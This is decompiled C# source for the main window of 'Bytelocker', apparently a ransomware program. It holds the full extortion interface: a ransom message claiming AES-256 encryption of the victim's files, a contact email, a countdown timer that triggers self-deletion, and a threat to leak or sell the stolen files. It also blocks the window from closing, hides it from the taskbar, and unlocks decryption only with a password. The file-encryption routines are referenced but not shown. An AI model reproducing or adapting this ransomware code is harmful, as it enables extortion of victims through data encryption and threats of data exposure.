using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Bytelocker.CryptoManager;
using Bytelocker.Settings;
using Bytelocker.Tools;

namespace Bytelocker.UI;

public class MainWindow : Form
{
	private const int MAX_FILE_SIZE_LENGHT_UI = 80;

	public static string current_decrypt_file = "null";

	private string current_decrypt_file_local = "null";

	private readonly LinkLabel llAESInfo;

	private readonly LinkLabel llListOfInfectedFiles;

	private PasswordManager pm;

	private int progress_bar_inc;

	private readonly RegistryManager rm;

	private readonly TimeManager tm;

	private IContainer components;

	private Button btnNext;

	private RichTextBox rtfInfo;

	private Label lbTitle;

	private PictureBox pbShield;

	private Label lbTitleTime;

	private Label lbTimeLeft;

	private Timer tmTimeLeftRefresher;

	private TextBox tbPassInput;

	private Button BtnVerify;

	private ProgressBar pbDecryptProgress;

	private Label lbCurrentFileDecrypt;

	private Timer tmTimerDecrypt;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public MainWindow()
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		InitializeComponent();
		((Form)this).set_MaximizeBox(false);
		tm = new TimeManager();
		rm = new RegistryManager();
		tm.ReadFromRegistry();
		llAESInfo = new LinkLabel();
		llListOfInfectedFiles = new LinkLabel();
		llListOfInfectedFiles.add_LinkClicked(new LinkLabelLinkClickedEventHandler(On_llListOfInfectedFiles_Click));
		llAESInfo.add_LinkClicked(new LinkLabelLinkClickedEventHandler(On_llAESInfo_Click));
	}

	private void MainWindow_Load(object sender, EventArgs e)
	{
		MainWindowScreenOne();
	}

	private void MainWindowScreenOne()
	{
		((Control)lbCurrentFileDecrypt).Hide();
		((Control)pbDecryptProgress).Hide();
		((Control)BtnVerify).Hide();
		((Control)tbPassInput).Hide();
		((TextBoxBase)rtfInfo).Clear();
		UpdateTime();
		((Control)llAESInfo).Show();
		((Control)llListOfInfectedFiles).Show();
		((Control)lbTitle).Show();
		((TextBoxBase)rtfInfo).AppendText("Your important files, documents, pictures, etc. Have been encrypted.\n\n");
		((Control)llListOfInfectedFiles).set_Text("Here");
		((Control)llListOfInfectedFiles).set_AutoSize(true);
		((Control)llListOfInfectedFiles).set_Location(((TextBoxBase)rtfInfo).GetPositionFromCharIndex(((TextBoxBase)rtfInfo).get_TextLength()));
		((Control)rtfInfo).get_Controls().Add((Control)(object)llListOfInfectedFiles);
		((TextBoxBase)rtfInfo).AppendText(((Control)llListOfInfectedFiles).get_Text());
		((TextBoxBase)rtfInfo).AppendText(new string(' ', 3));
		((TextBoxBase)rtfInfo).set_SelectionStart(((TextBoxBase)rtfInfo).get_TextLength());
		((TextBoxBase)rtfInfo).AppendText("is a complete list of encrypted files, you can verify this manually.\n\nEncryption was produced using");
		((Control)llAESInfo).set_Text("AES-256");
		((Control)llAESInfo).set_AutoSize(true);
		((Control)llAESInfo).set_Location(((TextBoxBase)rtfInfo).GetPositionFromCharIndex(((TextBoxBase)rtfInfo).get_TextLength()));
		((Control)rtfInfo).get_Controls().Add((Control)(object)llAESInfo);
		((TextBoxBase)rtfInfo).AppendText(((Control)llAESInfo).get_Text());
		((TextBoxBase)rtfInfo).AppendText(new string(' ', 3));
		((TextBoxBase)rtfInfo).set_SelectionStart(((TextBoxBase)rtfInfo).get_TextLength());
		((TextBoxBase)rtfInfo).AppendText("in order to decrypt the files, you need to obtain the password used to generate the key. You must contact us @ brokensecuritycrew@protonmail.com\n\nThe password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files.\n\n");
		((TextBoxBase)rtfInfo).AppendText("NOTE: Removal of or modification of this software will lead to inability to decrypt files. All of your files have been uploaded to our server. Should you not pay we will leak and/or sell your files, photos, documents, accounts to the highest bidder.");
	}

	private void BtnNext_Click(object sender, EventArgs e)
	{
		((TextBoxBase)rtfInfo).Clear();
		((Control)llAESInfo).Hide();
		((Control)llListOfInfectedFiles).Hide();
		((Control)lbTitle).Hide();
		((Control)tbPassInput).Show();
		((Control)btnNext).Hide();
		((Control)BtnVerify).Show();
		((TextBoxBase)rtfInfo).AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
		((TextBoxBase)rtfInfo).Select(((TextBoxBase)rtfInfo).GetFirstCharIndexFromLine(0), ((TextBoxBase)rtfInfo).get_Lines()[0].Length);
		rtfInfo.set_SelectionBullet(true);
		((TextBoxBase)rtfInfo).DeselectAll();
	}

	private void BtnVerify_Click(object sender, EventArgs e)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		pm = new PasswordManager();
		pm.FetchPassword();
		if (!(((Control)tbPassInput).get_Text() == pm.returnPassword()))
		{
			MessageBox.Show("Invalid Password", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			tmTimeLeftRefresher.Stop();
			((Control)BtnVerify).Hide();
			((Control)lbTimeLeft).set_Text("");
			((TextBoxBase)rtfInfo).Clear();
			((Control)tbPassInput).Hide();
			((Control)lbTitleTime).Hide();
			((Control)lbTitle).set_Text("Decrypting . . .");
			((Control)lbTitle).Show();
			((Control)lbCurrentFileDecrypt).Show();
			((Control)pbDecryptProgress).Show();
			progress_bar_inc = pbDecryptProgress.get_Maximum() / rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;
			tmTimerDecrypt.Start();
			new Thread((ThreadStart)delegate
			{
				Thread.CurrentThread.IsBackground = true;
				Bytelocker.Decrypt();
			}).Start();
		}
		pm = null;
	}

	private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void On_llAESInfo_Click(object sender, EventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
	}

	private void On_llBitcoinInfo_Click(object sender, EventArgs e)
	{
		Process.Start("https://bitcoin.org/en/getting-started");
	}

	private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
	{
		LaunchListOfEncryptedFilesWindow();
	}

	private void UpdateTimeLeftEvent(object sender, EventArgs e)
	{
		UpdateTime();
	}

	private void tmTimerDecrypt_Tick(object sender, EventArgs e)
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		if (!(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
		{
			if (!(current_decrypt_file_local == current_decrypt_file))
			{
				current_decrypt_file_local = current_decrypt_file;
				if (current_decrypt_file.Length > 80)
				{
					((Control)lbCurrentFileDecrypt).set_Text(TruncateFilePath.ShrinkPath(current_decrypt_file, 80));
				}
				else
				{
					((Control)lbCurrentFileDecrypt).set_Text(current_decrypt_file);
				}
				pbDecryptProgress.Increment(progress_bar_inc);
			}
		}
		else
		{
			tmTimerDecrypt.Stop();
			pbDecryptProgress.set_Value(pbDecryptProgress.get_Maximum());
			MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", (MessageBoxButtons)0, (MessageBoxIcon)64);
			((Control)this).set_Visible(false);
			Bytelocker.Uninstall();
		}
	}

	private void UpdateTime()
	{
		int num = (int)tm.DetermineRemainingTimeInSeconds();
		if (num < 0)
		{
			tmTimeLeftRefresher.Stop();
			((Control)lbTimeLeft).set_Text("00:00:00:00");
			((Control)this).set_Visible(false);
			Bytelocker.Uninstall();
		}
		else
		{
			((Control)lbTimeLeft).set_Text(TimeSpan.FromSeconds(num).ToString("dd\\:hh\\:mm\\:ss"));
		}
	}

	private void LaunchListOfEncryptedFilesWindow()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new EncryptedFilesList()).ShowDialog();
	}

	private void rtfInfo_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Expected O, but got Unknown
		//IL_02c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0335: Expected O, but got Unknown
		//IL_0356: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Expected O, but got Unknown
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0581: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0745: Expected O, but got Unknown
		//IL_074a: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainWindow));
		btnNext = new Button();
		rtfInfo = new RichTextBox();
		lbTitle = new Label();
		pbShield = new PictureBox();
		lbTitleTime = new Label();
		lbTimeLeft = new Label();
		tmTimeLeftRefresher = new Timer(components);
		tbPassInput = new TextBox();
		BtnVerify = new Button();
		pbDecryptProgress = new ProgressBar();
		lbCurrentFileDecrypt = new Label();
		tmTimerDecrypt = new Timer(components);
		((ISupportInitialize)pbShield).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnNext).set_Location(new Point(841, 469));
		((Control)btnNext).set_Margin(new Padding(4, 4, 4, 4));
		((Control)btnNext).set_Name("btnNext");
		((Control)btnNext).set_Size(new Size(160, 43));
		((Control)btnNext).set_TabIndex(0);
		((Control)btnNext).set_Text("Next >>");
		((ButtonBase)btnNext).set_UseVisualStyleBackColor(true);
		((Control)btnNext).add_Click((EventHandler)BtnNext_Click);
		((Control)rtfInfo).set_Location(new Point(312, 71));
		((Control)rtfInfo).set_Margin(new Padding(4, 4, 4, 4));
		((Control)rtfInfo).set_Name("rtfInfo");
		((TextBoxBase)rtfInfo).set_ReadOnly(true);
		rtfInfo.set_ScrollBars((RichTextBoxScrollBars)2);
		((Control)rtfInfo).set_Size(new Size(688, 389));
		((Control)rtfInfo).set_TabIndex(1);
		((Control)rtfInfo).set_Text("");
		((Control)rtfInfo).add_TextChanged((EventHandler)rtfInfo_TextChanged);
		((Control)lbTitle).set_AutoSize(true);
		((Control)lbTitle).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbTitle).set_Location(new Point(373, 11));
		((Control)lbTitle).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lbTitle).set_Name("lbTitle");
		((Control)lbTitle).set_Size(new Size(494, 36));
		((Control)lbTitle).set_TabIndex(2);
		((Control)lbTitle).set_Text("Your personal files are encrypted!");
		pbShield.set_Image((Image)componentResourceManager.GetObject("pbShield.Image"));
		((Control)pbShield).set_Location(new Point(56, 71));
		((Control)pbShield).set_Margin(new Padding(4, 4, 4, 4));
		((Control)pbShield).set_Name("pbShield");
		((Control)pbShield).set_Size(new Size(201, 222));
		pbShield.set_TabIndex(3);
		pbShield.set_TabStop(false);
		((Control)lbTitleTime).set_AutoSize(true);
		((Control)lbTitleTime).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lbTitleTime).set_Location(new Point(103, 336));
		((Control)lbTitleTime).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lbTitleTime).set_Name("lbTitleTime");
		((Control)lbTitleTime).set_Size(new Size(92, 25));
		((Control)lbTitleTime).set_TabIndex(4);
		((Control)lbTitleTime).set_Text("Time left:");
		((Control)lbTimeLeft).set_AutoSize(true);
		((Control)lbTimeLeft).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbTimeLeft).set_Location(new Point(83, 373));
		((Control)lbTimeLeft).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lbTimeLeft).set_Name("lbTimeLeft");
		((Control)lbTimeLeft).set_Size(new Size(129, 25));
		((Control)lbTimeLeft).set_TabIndex(6);
		((Control)lbTimeLeft).set_Text("00:00:00:00");
		tmTimeLeftRefresher.set_Enabled(true);
		tmTimeLeftRefresher.set_Interval(1000);
		tmTimeLeftRefresher.add_Tick((EventHandler)UpdateTimeLeftEvent);
		((Control)tbPassInput).set_Location(new Point(345, 117));
		((Control)tbPassInput).set_Margin(new Padding(4, 4, 4, 4));
		((Control)tbPassInput).set_Name("tbPassInput");
		((Control)tbPassInput).set_Size(new Size(453, 22));
		((Control)tbPassInput).set_TabIndex(7);
		((Control)BtnVerify).set_Location(new Point(841, 469));
		((Control)BtnVerify).set_Margin(new Padding(4, 4, 4, 4));
		((Control)BtnVerify).set_Name("BtnVerify");
		((Control)BtnVerify).set_Size(new Size(160, 43));
		((Control)BtnVerify).set_TabIndex(9);
		((Control)BtnVerify).set_Text("Verify");
		((ButtonBase)BtnVerify).set_UseVisualStyleBackColor(true);
		((Control)BtnVerify).add_Click((EventHandler)BtnVerify_Click);
		((Control)pbDecryptProgress).set_Location(new Point(345, 282));
		((Control)pbDecryptProgress).set_Margin(new Padding(4, 4, 4, 4));
		((Control)pbDecryptProgress).set_Name("pbDecryptProgress");
		((Control)pbDecryptProgress).set_Size(new Size(623, 26));
		((Control)pbDecryptProgress).set_TabIndex(10);
		((Control)lbCurrentFileDecrypt).set_AutoSize(true);
		((Control)lbCurrentFileDecrypt).set_Location(new Point(341, 251));
		((Control)lbCurrentFileDecrypt).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lbCurrentFileDecrypt).set_Name("lbCurrentFileDecrypt");
		((Control)lbCurrentFileDecrypt).set_Size(new Size(0, 16));
		((Control)lbCurrentFileDecrypt).set_TabIndex(11);
		tmTimerDecrypt.set_Interval(80);
		tmTimerDecrypt.add_Tick((EventHandler)tmTimerDecrypt_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1012, 518));
		((Control)this).get_Controls().Add((Control)(object)lbCurrentFileDecrypt);
		((Control)this).get_Controls().Add((Control)(object)pbDecryptProgress);
		((Control)this).get_Controls().Add((Control)(object)BtnVerify);
		((Control)this).get_Controls().Add((Control)(object)tbPassInput);
		((Control)this).get_Controls().Add((Control)(object)lbTimeLeft);
		((Control)this).get_Controls().Add((Control)(object)lbTitleTime);
		((Control)this).get_Controls().Add((Control)(object)pbShield);
		((Control)this).get_Controls().Add((Control)(object)lbTitle);
		((Control)this).get_Controls().Add((Control)(object)rtfInfo);
		((Control)this).get_Controls().Add((Control)(object)btnNext);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Control)this).set_Name("MainWindow");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Bytelocker");
		((Form)this).add_Load((EventHandler)MainWindow_Load);
		((ISupportInitialize)pbShield).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
